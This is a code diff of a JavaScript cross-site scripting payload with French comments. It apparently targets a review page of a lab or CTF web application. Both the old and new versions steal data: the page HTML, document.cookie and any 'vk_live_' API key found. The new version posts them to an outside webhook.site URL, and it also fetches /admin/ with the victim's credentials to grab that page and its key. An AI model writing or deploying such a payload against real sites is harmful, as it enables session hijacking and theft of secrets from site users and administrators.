@@ -1,19 +1,37 @@
-// Utiliser l'URL ngrok à la place de votre IP
-const listener = "https://VOTRE_NGROK_URL.ngrok.io";
+// === CONFIGURATION ===
+const WEBHOOK = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";
 
-function send(data) {
-    new Image().src = listener + "/?data=" + encodeURIComponent(data);
+// === FONCTION D'EXFILTRATION ===
+function exfil(data) {
+    fetch(WEBHOOK, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+    });
 }
 
-// Exfiltrer le HTML de la page
+// === RÉCUPÉRATION DES DONNÉES ===
+// 1. Page actuelle (review.php)
 const html = document.documentElement.outerHTML;
-send("PAGE: " + html.substring(0, 2000));
+exfil("URL: " + location.href + "\n\n--- PAGE HTML ---\n" + html);
 
-// Chercher l'API key
+// 2. Recherche de l'API key dans la page
 const keyMatch = html.match(/vk_live_[a-f0-9]{40}/);
 if (keyMatch) {
-    send("API_KEY: " + keyMatch[0]);
+    exfil("🚨 API KEY TROUVÉE: " + keyMatch[0]);
 }
 
-// Envoyer le cookie
-send("COOKIE: " + document.cookie);
+// 3. Cookies
+exfil("🍪 COOKIES: " + document.cookie);
+
+// 4. Tentative de fetch vers /admin/
+fetch('/admin/', { credentials: 'include' })
+    .then(r => r.text())
+    .then(adminHtml => {
+        const adminKey = adminHtml.match(/vk_live_[a-f0-9]{40}/);
+        if (adminKey) {
+            exfil("🚨 ADMIN API KEY: " + adminKey[0]);
+        }
+        exfil("--- /admin/ HTML ---\n" + adminHtml.substring(0, 2000));
+    })
+    .catch(e => exfil("❌ Erreur fetch /admin/: " + e.message));
